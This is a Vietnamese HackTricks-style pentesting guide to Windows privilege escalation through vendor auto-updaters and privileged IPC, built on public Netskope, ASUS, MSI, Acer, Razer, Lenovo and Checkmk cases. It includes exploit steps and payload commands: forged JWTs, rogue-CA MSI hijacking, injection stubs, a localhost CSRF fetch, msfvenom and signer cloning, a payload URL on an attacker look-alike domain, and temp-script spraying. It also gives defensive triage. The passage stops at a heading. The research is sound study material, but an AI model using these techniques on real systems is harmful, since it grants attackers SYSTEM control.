# Lạm dụng Enterprise Auto-Updaters và Privileged IPC (ví dụ: Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Trang này khái quát một nhóm chuỗi Windows local privilege escalation được phát hiện trong các agent và updater endpoint dành cho doanh nghiệp. Các sản phẩm này để lộ một bề mặt IPC dễ tiếp cận và có quy trình cập nhật chạy với đặc quyền cao. Một ví dụ điển hình là Netskope Client for Windows < R129 (CVE-2025-0309), trong đó người dùng có đặc quyền thấp có thể ép quá trình đăng ký kết nối tới máy chủ do attacker kiểm soát, rồi gửi một MSI độc hại để service SYSTEM cài đặt.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Các ý tưởng chính có thể áp dụng với sản phẩm tương tự:
- Lạm dụng IPC trên localhost của service có đặc quyền cao để buộc đăng ký lại hoặc cấu hình lại tới máy chủ của attacker.
- Triển khai các endpoint cập nhật của vendor, gửi một Trusted Root CA giả mạo và trỏ updater tới một package độc hại được “ký”.
- Vượt qua các bước kiểm tra signer yếu (danh sách cho phép CN), cờ digest không bắt buộc và các thuộc tính MSI lỏng lẻo.
- Nếu IPC được “mã hóa”, suy ra key/IV từ các mã định danh máy có thể đọc công khai, được lưu trong registry.
- Nếu service giới hạn caller dựa trên đường dẫn image/tên process, hãy inject vào một process nằm trong danh sách cho phép hoặc khởi chạy một process ở trạng thái suspended rồi bootstrap DLL bằng cách vá tối thiểu thread context.

Các local TCP service tùy chỉnh cũng cần được xem xét về danh tính và ranh giới đầu vào, ngay cả khi chúng yêu cầu PIN hoặc thông tin xác thực khác của ứng dụng. Xác định process và service account hiệu lực của listener, sau đó kiểm tra chính xác binary/version đang triển khai, cũng như liệu các trường do caller kiểm soát có được kiểm tra độ dài trước khi sao chép vào buffer cố định hoặc dùng để tạo lệnh cho child process hay không. [Hướng dẫn của Microsoft về buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) giải thích vì sao đầu vào bên ngoài không được kiểm tra có thể nguy hiểm trong native code chạy với đặc quyền cao. Một loopback listener, thông tin xác thực được hardcode hoặc chỉ riêng tên process không chứng minh được có memory corruption hay khả năng thực thi với quyền SYSTEM; khả năng truy cập, ủy quyền, code path và các biện pháp giảm thiểu vẫn là những điều kiện riêng biệt. Chỉ nên liệt kê thông tin theo cách thụ động trong các hoạt động thông thường, thay vì gửi đầu vào dài đến mức gây crash tới service đang chạy.

---
## 1) Ép đăng ký tới máy chủ của attacker qua localhost IPC

Nhiều agent có một tiến trình UI ở user mode giao tiếp với service SYSTEM qua localhost TCP bằng JSON.

Đã quan sát thấy trong Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Quy trình exploit:
1) Tạo JWT enrollment token có các claims điều khiển backend host (ví dụ: AddonUrl). Dùng alg=None để không cần chữ ký.
2) Gửi IPC message gọi lệnh provisioning cùng với JWT và tên tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Dịch vụ bắt đầu gửi yêu cầu đến server giả mạo của bạn để lấy thông tin đăng ký/cấu hình, ví dụ:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Lưu ý:
- Nếu việc xác minh caller dựa trên đường dẫn/tên, hãy khởi tạo yêu cầu từ một binary của vendor nằm trong allow-list (xem §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC quản lý lộ ra mạng

Ranh giới tin cậy này không phải lúc nào cũng chỉ giới hạn ở localhost. Trong trường hợp MyReport Updater 2.1.1 được báo cáo, một dịch vụ `LocalSystem` lắng nghe trên tất cả các giao diện và chấp nhận yêu cầu thay đổi cấu hình gRPC không cần xác thực đối với reference host, port và chế độ hoạt động. Với biến thể từ xa, cần có cả quyền truy cập mạng đến listener lẫn quyền truy cập outbound từ dịch vụ đến reference đã chọn. Hãy đánh giá riêng các yếu tố này với việc liệu luồng xử lý gói sau đó có thể vượt qua ranh giới ghi tệp hay không.<sup>[[16]](#references)</sup>

---
## 2) Chiếm quyền update channel để chạy code dưới quyền SYSTEM

Khi client kết nối đến server của bạn, hãy triển khai các endpoint mà nó mong đợi và điều hướng nó đến một MSI do attacker kiểm soát. Trình tự thường gặp:

1) /v2/config/org/clientconfig → Trả về cấu hình JSON với khoảng thời gian cập nhật của updater rất ngắn, ví dụ:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Trả về chứng chỉ CA dạng PEM. Service cài chứng chỉ này vào kho Trusted Root của Local Machine.
3) /v2/checkupdate → Cung cấp metadata trỏ đến một MSI độc hại và phiên bản giả.

Vượt qua các kiểm tra phổ biến ngoài thực tế:
- Danh sách cho phép Signer CN: service có thể chỉ kiểm tra Subject CN có bằng “netSkope Inc” hoặc “Netskope, Inc.” hay không. Rogue CA của bạn có thể cấp leaf certificate với CN đó và ký MSI.
- Thuộc tính CERT_DIGEST: thêm một thuộc tính MSI vô hại tên là CERT_DIGEST. Không có bước thực thi kiểm tra này khi cài đặt.
- Tùy chọn thực thi kiểm tra digest: cờ cấu hình (ví dụ: check_msi_digest=false) vô hiệu hóa bước xác thực mật mã bổ sung.

Kết quả: service SYSTEM cài MSI từ
C:\ProgramData\Netskope\stAgent\data\*.msi
và thực thi code tùy ý với quyền NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Bài học về cách vượt qua bản vá: nếu vendor phản ứng bằng cách thêm một số ít domain “đáng tin cậy” vào danh sách cho phép thay vì xác thực nguồn cập nhật bằng mật mã, hãy tìm các redirector hoặc reverse proxy thuộc sở hữu của vendor vẫn cho phép bạn điều hướng traffic. Trong trường hợp của Netskope, nghiên cứu công khai sau đó cho thấy danh sách cho phép thời R129 vẫn có thể bị lạm dụng thông qua `rproxy.goskope.com`, vốn proxy nội dung Azure App Service do attacker kiểm soát. Hãy xem danh sách cho phép hostname là chướng ngại nhỏ, không phải ranh giới tin cậy.<sup>[[14]](#references)</sup>

Một dạng lỗi khác là **metadata gói nhất quán với nhau nhưng không được xác thực**. Trong trường hợp MyReport, một tham chiếu do attacker kiểm soát phân phối archive đã chỉnh sửa, trong khi một intermediary thay đổi phản hồi MD5 digest và kích thước của vendor trước khi chúng đến updater. Việc các giá trị khớp nhau chỉ kiểm tra tính nhất quán của phản hồi, chứ không xác minh nguồn gốc từ vendor; không cần tạo va chạm MD5. Sau đó, việc caller được chọn thư mục cài đặt đã biến thao tác giải nén có đặc quyền thành một ranh giới ghi file. Primitive nạp DLL phát sinh được trình bày trong [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Giả mạo yêu cầu IPC đã mã hóa (nếu có)

Từ R127, Netskope đóng gói JSON IPC trong một trường encryptData trông giống Base64. Phân tích ngược cho thấy sử dụng AES với key/IV được tạo từ các giá trị registry mà bất kỳ user nào cũng có thể đọc:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attacker có thể tái tạo quá trình mã hóa và gửi các command đã mã hóa hợp lệ từ một standard user.<sup>[[1]](#references)[[2]](#references)</sup> Mẹo chung: nếu một agent đột nhiên “mã hóa” IPC, hãy tìm device ID, product GUID, install ID trong HKLM được dùng làm dữ liệu đầu vào.

---
## 4) Vượt qua danh sách cho phép caller IPC (kiểm tra path/name)

Một số service cố xác thực peer bằng cách phân giải PID của kết nối TCP rồi so sánh image path/name với các binary của vendor trong Program Files nằm trong danh sách cho phép (ví dụ: stagentui.exe, bwansvc.exe, epdlp.exe).

Hai cách vượt qua thực tế:
- DLL injection vào một process nằm trong danh sách cho phép (ví dụ: nsdiag.exe) rồi proxy IPC từ bên trong process đó.
- Khởi chạy một binary nằm trong danh sách cho phép ở trạng thái suspended rồi khởi tạo proxy DLL mà không dùng CreateRemoteThread (xem §5) để đáp ứng các quy tắc chống can thiệp được driver thực thi.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection tương thích với tamper protection: process suspended + vá NtContinue

Các sản phẩm thường đi kèm driver minifilter/OB callbacks (ví dụ: Stadrv) để loại bỏ các quyền nguy hiểm khỏi handle trỏ đến process được bảo vệ:
- Process: loại bỏ PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: giới hạn quyền ở THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Một user-mode loader đáng tin cậy, tuân thủ các giới hạn này:
1) Tạo một process từ binary của vendor với CREATE_SUSPENDED.
2) Lấy các handle bạn vẫn được phép dùng: PROCESS_VM_WRITE | PROCESS_VM_OPERATION trên process và một thread handle với THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (hoặc chỉ THREAD_RESUME nếu bạn vá code tại một RIP đã biết).
3) Ghi đè ntdll!NtContinue (hoặc một thunk khác được map sớm và chắc chắn) bằng một stub nhỏ gọi LoadLibraryW với đường dẫn DLL của bạn, rồi nhảy trở lại.
4) Gọi ResumeThread để kích hoạt stub bên trong process và nạp DLL của bạn.

Vì bạn không dùng PROCESS_CREATE_THREAD hoặc PROCESS_SUSPEND_RESUME trên một process đã được bảo vệ (bạn đã tạo process đó), nên đáp ứng được chính sách của driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Công cụ thực tế
- NachoVPN (plugin của Netskope) tự động hóa việc tạo rogue CA, ký MSI độc hại và cung cấp các endpoint cần thiết: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope là IPC client tùy chỉnh, tạo các thông điệp IPC tùy ý (tùy chọn mã hóa AES) và có thêm chức năng injection process suspended để gửi yêu cầu từ một binary nằm trong danh sách cho phép.<sup>[[4]](#references)</sup>

## 7) Quy trình triage nhanh cho các bề mặt updater/IPC chưa biết

Khi kiểm tra một endpoint agent mới hoặc bộ “helper” của motherboard, một quy trình nhanh thường đủ để xác định liệu đây có phải mục tiêu privesc tiềm năng hay không:<sup>[[6]](#references)</sup>

1) Liệt kê các listener loopback và xác định process của vendor tương ứng:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Liệt kê các named pipe tiềm năng:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Thu thập dữ liệu định tuyến được lưu trong registry mà các máy chủ IPC dựa trên plugin sử dụng:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Trích xuất tên endpoint, JSON keys và command IDs trước tiên từ client user-mode. Các frontend Electron/.NET được đóng gói thường leak toàn bộ schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Hãy tìm điều kiện tin cậy thực sự, chứ không chỉ đường đi trong mã cuối cùng khởi chạy tiến trình:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Các pattern đáng ưu tiên:
- `CryptQueryObject`/phân tích certificate mà không có `WinVerifyTrust` thường cho thấy hệ thống đã xem “certificate tồn tại” là “certificate đáng tin cậy”, từ đó cho phép clone certificate hoặc dùng các thủ thuật giả mạo signer khác.
- Kiểm tra chuỗi con/hậu tố trên `Origin`, `Referer`, URL tải xuống, tên process hoặc CN của signer không phải là xác thực. `contains(".vendor.com")` thường có thể bị khai thác bằng domain giả mạo giống domain thật do attacker kiểm soát.
- Nếu GUI có quyền thấp quyết định “file đáng tin cậy” còn SYSTEM broker chỉ sử dụng kết quả đó, việc patch hoặc triển khai lại DLL/JS phía client thường có thể vượt qua hoàn toàn ranh giới bảo vệ (kiểu Razer với validation tách biệt).
- Nếu broker sao chép payload vào `%TEMP%`/`C:\Windows\Temp` rồi mới validate hoặc lên lịch chạy từ đường dẫn đó, hãy kiểm tra ngay các khoảng thời gian TOCTOU có thể bị lợi dụng để thay thế file, cũng như các sibling plugin module có cung cấp wrapper `ExecuteTask()` thay thế với kiểm tra yếu hơn.<sup>[[6]](#references)</sup>

Với các mục tiêu sử dụng nhiều named pipe, PipeViewer là cách nhanh để phát hiện DACL yếu và các pipe có thể truy cập từ xa trước khi bắt đầu reverse protocol chuyên sâu.<sup>[[11]](#references)</sup>

Nếu mục tiêu chỉ xác thực caller bằng PID, đường dẫn image hoặc tên process, hãy xem đó là trở ngại nhỏ chứ không phải ranh giới bảo vệ: inject vào client hợp lệ hoặc tạo kết nối từ một process được allow-list thường đã đủ để vượt qua các kiểm tra của server. Riêng với named pipe, [trang này về client impersonation và lạm dụng pipe](named-pipe-client-impersonation.md) trình bày primitive này chi tiết hơn.

Với **cleanup hoặc restore broker có đặc quyền**, hãy kiểm tra ranh giới tin cậy của đường dẫn bên cạnh pipe ACL. Caller có quyền thấp hơn có thể chọn đích restore hoặc đổi tên artifact backup đã staging trong thư mục dùng chung, ngay cả khi executable của service và thư mục cài đặt của nó được bảo vệ. Hãy xác nhận riêng rằng caller có thể gọi lệnh restore, sửa đúng input hoặc filename đã staging, broker chạy dưới identity cao hơn, và thao tác restore thực sự ghi vào đường dẫn được bảo vệ đã chọn. Chỉ riêng staging directory có quyền ghi hoặc pipe có thể đọc không đủ để chứng minh có thể ghi tùy ý với đặc quyền cao; cần review code hoặc kiểm thử có kiểm soát để xác định cách ánh xạ đích và hành vi của service. Không gọi một lệnh cleanup chưa rõ chức năng trong quá trình enumeration thụ động vì lệnh đó có thể xóa file của người dùng.

---
## 8) Broker add-in dạng module chỉ xác thực bằng chữ ký của vendor (mẫu Lenovo Vantage)

Một biến thể mới hơn đáng để tìm kiếm là **signed-client RPC broker**: một desktop process có quyền thấp, được Lenovo ký, giao tiếp với SYSTEM service; service định tuyến các lệnh JSON đến một nhóm add-in được mô tả bằng XML trong `%ProgramData%`. Khi đã thực thi code **bên trong bất kỳ signed client nào được chấp nhận**, mọi contract có `runas="system"` đều trở thành một phần của attack surface.<sup>[[15]](#references)</sup>

Các primitive giá trị cao được ghi nhận trong nghiên cứu Lenovo Vantage:
- **Tin caller vì caller được vendor ký**: các nhà nghiên cứu đã đạt được authenticated context bằng cách sao chép một EXE có chữ ký Lenovo vào thư mục có quyền ghi và đáp ứng DLL side-load (`profapi.dll`), khiến arbitrary code chạy bên trong một client mà service đã tin cậy.
- **Khám phá attack surface dựa trên manifest**: add-in được khai báo trong `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; một số contract chạy dưới quyền `SYSTEM`, vì vậy enumerate các manifest này thường giúp phát hiện các privileged verb thực sự nhanh hơn reverse chính broker.
- **Lỗi theo từng command phía sau authenticated channel**: khi đã ở bên trong trusted client, các nghiên cứu công khai phát hiện lỗi path-traversal kết hợp race condition trong các verb update/install, lạm dụng raw SQL trong các privileged settings database, và kiểm tra đường dẫn registry dựa trên chuỗi con, cho phép ghi ra ngoài hive dự kiến.

Recon hữu ích trên mục tiêu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Bài học thực tiễn: bất cứ khi nào một bộ công cụ hỗ trợ cung cấp broker xác thực **process gọi** trước, rồi mới điều phối đến hàng chục lệnh plugin/add-in, đừng dừng lại sau khi bypass bước kiểm tra độ tin cậy ban đầu. Dump bảng manifest/contract và fuzz riêng từng verb có đặc quyền cao; channel đã xác thực thường che giấu một số bug ở giai đoạn thứ hai.

---
## 1) CSRF từ browser đến localhost nhằm vào các HTTP API có đặc quyền (ASUS DriverHub)

DriverHub cung cấp một HTTP service chạy ở user-mode (ADU.exe) trên 127.0.0.1:53000, yêu cầu các lệnh gọi từ browser xuất phát từ https://driverhub.asus.com. Bộ lọc origin chỉ thực hiện `string_contains(".asus.com")` trên header Origin và trên các URL tải xuống được cung cấp qua `/asus/v1.0/*`. Do đó, bất kỳ host nào do attacker kiểm soát, chẳng hạn `https://driverhub.asus.com.attacker.tld`, đều vượt qua bước kiểm tra và có thể gửi các request làm thay đổi trạng thái từ JavaScript.<sup>[[6]](#references)</sup> Xem [các kiến thức cơ bản về CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) để biết thêm các kiểu bypass.

Luồng thực hiện:
1) Đăng ký một domain có chứa `.asus.com` và host một trang web độc hại tại đó.
2) Dùng `fetch` hoặc XHR để gọi một endpoint có đặc quyền (ví dụ: `Reboot`, `UpdateApp`) trên `http://127.0.0.1:53000`.
3) Gửi JSON body mà handler yêu cầu – frontend JS đã được đóng gói cho thấy schema bên dưới.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ngay cả PowerShell CLI được hiển thị bên dưới cũng thành công khi header Origin được giả mạo thành giá trị đáng tin cậy:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Mọi lượt truy cập bằng trình duyệt vào site của attacker vì thế đều trở thành local CSRF chỉ cần 1 lần nhấp (hoặc 0 lần nhấp thông qua `onload`), điều khiển một helper chạy với quyền SYSTEM.

---
## 2) Xác minh code-signing không an toàn & sao chép certificate (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` tải xuống các executable tùy ý được chỉ định trong phần thân JSON và lưu vào bộ nhớ đệm tại `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Việc xác thực URL tải xuống dùng lại cùng logic kiểm tra chuỗi con, nên `http://updates.asus.com.attacker.tld:8000/payload.exe` vẫn được chấp nhận. Sau khi tải xuống, ADU.exe chỉ kiểm tra PE có chữ ký và chuỗi Subject khớp với ASUS trước khi chạy – không có `WinVerifyTrust`, không xác thực chain.

Để weaponize quy trình này:
1) Tạo payload (ví dụ: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sao chép signer của ASUS vào payload (ví dụ: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` trên một domain giả mạo `.asus.com` rồi kích hoạt UpdateApp thông qua browser CSRF ở trên.

Vì cả bộ lọc Origin lẫn URL đều dựa trên chuỗi con, còn kiểm tra signer chỉ so sánh chuỗi, DriverHub tải và thực thi binary của attacker trong ngữ cảnh quyền cao.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU trong các luồng sao chép/thực thi của updater (MSI Center CMD_AutoUpdateSDK)

Service chạy với quyền SYSTEM của MSI Center cung cấp giao thức TCP, trong đó mỗi frame có định dạng `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component lõi (Component ID `0f 27 00 00`) có `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler của nó:
1) Sao chép executable được cung cấp vào `C:\Windows\Temp\MSI Center SDK.exe`.
2) Xác minh chữ ký thông qua `CS_CommonAPI.EX_CA::Verify` (subject của certificate phải bằng “MICRO-STAR INTERNATIONAL CO., LTD.” và `WinVerifyTrust` phải thành công).
3) Tạo scheduled task chạy file tạm với quyền SYSTEM và các arguments do attacker kiểm soát.

File được sao chép không bị khóa giữa lúc xác minh và `ExecuteTask()`. Attacker có thể:
- Gửi Frame A trỏ đến một binary có chữ ký hợp lệ của MSI (đảm bảo vượt qua kiểm tra chữ ký và task được đưa vào hàng đợi).
- Gửi liên tục các thông điệp Frame B để ghi đè `MSI Center SDK.exe` ngay sau khi quá trình xác minh hoàn tất.

Khi scheduler kích hoạt, nó thực thi payload bị ghi đè với quyền SYSTEM, dù file ban đầu đã được xác minh. Khai thác ổn định cần dùng hai goroutine/thread gửi liên tục CMD_AutoUpdateSDK cho đến khi chiếm được cửa sổ TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Lạm dụng IPC tùy chỉnh cấp SYSTEM & impersonation (MSI Center + Acer Control Centre)

### Các bộ lệnh TCP của MSI Center
- Mỗi plugin/DLL được `MSI.CentralServer.exe` nạp đều nhận một Component ID được lưu trong `HKLM\SOFTWARE\MSI\MSI_CentralServer`. 4 byte đầu tiên của frame chọn component đó, cho phép attacker định tuyến lệnh đến các module tùy ý.
- Plugin có thể định nghĩa task runner riêng. `Support\API_Support.dll` cung cấp `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` và gọi trực tiếp `API_Support.EX_Task::ExecuteTask()` mà **không xác thực chữ ký** – bất kỳ local user nào cũng có thể trỏ nó đến `C:\Users\<user>\Desktop\payload.exe` để có được quyền thực thi SYSTEM một cách chắc chắn.
- Dùng Wireshark để sniff loopback hoặc instrument các binary .NET trong dnSpy sẽ nhanh chóng tiết lộ mapping Component ↔ command; sau đó có thể dùng client Go/Python tùy chỉnh để phát lại các frame.<sup>[[6]](#references)</sup>

### Named pipe và mức impersonation của Acer Control Centre
- `ACCSvc.exe` (SYSTEM) cung cấp `\\.\pipe\treadstone_service_LightMode`, và discretionary ACL của nó cho phép client từ xa (ví dụ: `\\TARGET\pipe\treadstone_service_LightMode`). Gửi command ID `7` kèm đường dẫn file sẽ gọi routine tạo process của service.
- Client library tuần tự hóa một byte kết thúc đặc biệt (113) cùng với args. Dynamic instrumentation bằng Frida/`TsDotNetLib` (xem [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) để biết mẹo instrumentation) cho thấy native handler ánh xạ giá trị này thành `SECURITY_IMPERSONATION_LEVEL` và integrity SID trước khi gọi `CreateProcessAsUser`.
- Thay 113 (`0x71`) bằng 114 (`0x72`) sẽ chuyển sang nhánh generic, nhánh này giữ nguyên SYSTEM token đầy đủ và đặt high-integrity SID (`S-1-16-12288`). Vì vậy, binary được khởi chạy chạy dưới quyền SYSTEM không bị hạn chế, cả trên máy cục bộ lẫn giữa các máy.
- Kết hợp cách này với installer flag được để lộ (`Setup.exe -nocheck`) để cài ACC ngay cả trên lab VM và thử nghiệm pipe mà không cần phần cứng của vendor.<sup>[[6]](#references)</sup>

Các lỗi IPC này cho thấy vì sao service localhost phải thực thi mutual authentication (ALPC SID, bộ lọc `ImpersonationLevel=Impersonation`, token filtering), và vì sao helper “run arbitrary binary” của mọi module phải dùng chung các bước xác minh signer.

---
## 3) Helper COM/IPC “elevator” dựa trên xác thực user-mode yếu (Razer Synapse 4)

Razer Synapse 4 bổ sung một pattern hữu ích khác trong nhóm này: user có quyền thấp có thể yêu cầu một COM helper khởi chạy process thông qua `RzUtility.Elevator`, trong khi quyết định tin cậy được giao cho một DLL user-mode (`simple_service.dll`) thay vì được thực thi một cách vững chắc bên trong ranh giới đặc quyền.

Luồng khai thác được quan sát:
- Tạo instance của COM object `RzUtility.Elevator`.
- Gọi `LaunchProcessNoWait(<path>, "", 1)` để yêu cầu khởi chạy với quyền cao.
- Trong public PoC, bước kiểm tra chữ ký PE bên trong `simple_service.dll` bị patch trước khi gửi yêu cầu, cho phép khởi chạy một executable bất kỳ do attacker chọn.<sup>[[6]](#references)[[10]](#references)</sup>

Lệnh PowerShell tối giản:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Nhận định chung: khi reverse “helper” suites, đừng chỉ kiểm tra localhost TCP hoặc named pipes. Hãy kiểm tra các COM class có tên như `Elevator`, `Launcher`, `Updater` hoặc `Utility`, rồi xác minh xem service đặc quyền có thực sự tự xác thực binary đích hay chỉ tin vào kết quả do client DLL ở user-mode có thể bị patch tính toán. Mô hình này không chỉ giới hạn ở Razer: mọi thiết kế phân tách trong đó broker có đặc quyền cao tiêu thụ quyết định allow/deny từ phía có đặc quyền thấp đều có thể là bề mặt privesc.


---
## Thực thi script temp có thể dự đoán trong quá trình sửa chữa MSI (Checkmk Agent / CVE-2024-0670)

Một số Windows agent vẫn thực hiện các hành động đặc quyền bằng cách ghi một file `.cmd` tạm thời vào `C:\Windows\Temp` rồi thực thi file đó với quyền `SYSTEM`. Nếu tên file có thể dự đoán được và service không tạo lại các file hiện có một cách an toàn, người dùng có đặc quyền thấp có thể tạo trước file temp sắp được dùng với thuộc tính **read-only**, khiến tiến trình đặc quyền thực thi nội dung do attacker kiểm soát thay vì script của chính nó.

Đã quan sát thấy trong các bản build Checkmk Agent có lỗ hổng:
- mẫu temp: `cmk_all_<PID>_1.cmd`
- các nhánh bị ảnh hưởng: `2.0.0`, `2.1.0`, `2.2.0`
- kích hoạt: **repair** MSI của agent đã được cache<sup>[[8]](#references)[[9]](#references)</sup>

Quy trình thực tế:
1. Ước tính khoảng PID thực tế dựa trên các process ID hiện tại hoặc PID của agent đang chạy.
2. Ghi payload `.cmd` **ASCII** ngắn (`Set-Content -Encoding Ascii` hoặc dùng chuyển hướng của `cmd.exe`; tránh đầu ra PowerShell UTF-16 cho batch file).
3. Tạo hàng loạt `C:\Windows\Temp\cmk_all_<PID>_1.cmd` trong khoảng ứng viên và đặt thuộc tính read-only cho mỗi file.
4. Kích hoạt repair MSI đã cache để service đặc quyền cố tạo lại rồi thực thi temp script.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Nếu sản phẩm dễ bị tổn thương được cài đặt bằng Windows Installer, hãy xác định tên sản phẩm tương ứng với tệp MSI được lưu trong bộ nhớ đệm có tên trông ngẫu nhiên trong `C:\Windows\Installer` trước khi kích hoạt quá trình sửa chữa:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Ghi chú vận hành:
- `qwinsta` hữu ích khi `msiexec /fa` thất bại trong WinRM shell không tương tác và bạn cần xác định liệu một phiên desktop hiện có/đã ngắt kết nối có thể kích hoạt quá trình sửa chữa đúng cách hay không.<sup>[[7]](#references)</sup>
- Mẫu này cũng áp dụng cho các endpoint agent và updater khác có **stage script tạm trong các vị trí world-writable rồi thực thi chúng với quyền SYSTEM**. Kiểm tra tên có thể dự đoán, thiếu cơ chế tạo độc quyền và các luồng sửa chữa/cập nhật có thể được kích hoạt theo yêu cầu.

### Sửa chữa trình cài đặt tương tác và console có quyền cao

PDF24 Creator 11.15.1 cho thấy một rủi ro riêng khi sửa chữa MSI: custom action cài đặt máy in có thể mở một console hiển thị với quyền SYSTEM trong quá trình sửa chữa. Nhà cung cấp đã thay đổi MSI installer trong phiên bản 11.15.2 để khắc phục hành vi này. Phiên bản sản phẩm cũ chỉ là đầu mối để phân loại. Hãy kiểm tra gói MSI đã đăng ký hoặc có thể truy cập, liệu người dùng này có thể khởi chạy quá trình sửa chữa hay không, custom action dễ bị khai thác và độ trễ ghi log có hiện diện hay không, và liệu desktop tương tác có thể hiển thị console hay không. Độ trễ được báo cáo sử dụng oplock trên `faxPrnInst.log`; quyền ghi thông thường vào file không phải là điều kiện truy cập duy nhất. Shell không tương tác, gói không thể truy cập hoặc installer đã được vá đều có thể làm đứt chuỗi khai thác. Vấn đề này không phụ thuộc vào `AlwaysInstallElevated` và khác với việc thay thế một script tạm có tên dễ dự đoán.

---
## Chiếm quyền chuỗi cung ứng từ xa qua cơ chế xác thực updater yếu (WinGUp / Notepad++)

Trong khoảng thời gian từ tháng 6 năm 2025 đến tháng 12 năm 2025, những kẻ tấn công xâm nhập hạ tầng lưu trữ đứng sau luồng cập nhật Notepad++ đã chọn lọc gửi manifest độc hại đến các nạn nhân cụ thể. Các updater đời cũ dựa trên WinGUp không xác minh đầy đủ tính xác thực của bản cập nhật, vì vậy phản hồi XML độc hại có thể chuyển hướng client đến các URL do kẻ tấn công kiểm soát. Do client chấp nhận nội dung HTTPS mà không bắt buộc phải có cả chuỗi chứng chỉ đáng tin cậy lẫn chữ ký PE hợp lệ trên installer đã tải xuống, nạn nhân đã tải về và thực thi một `update.exe` NSIS bị cài trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Luồng hoạt động (không cần khai thác cục bộ):
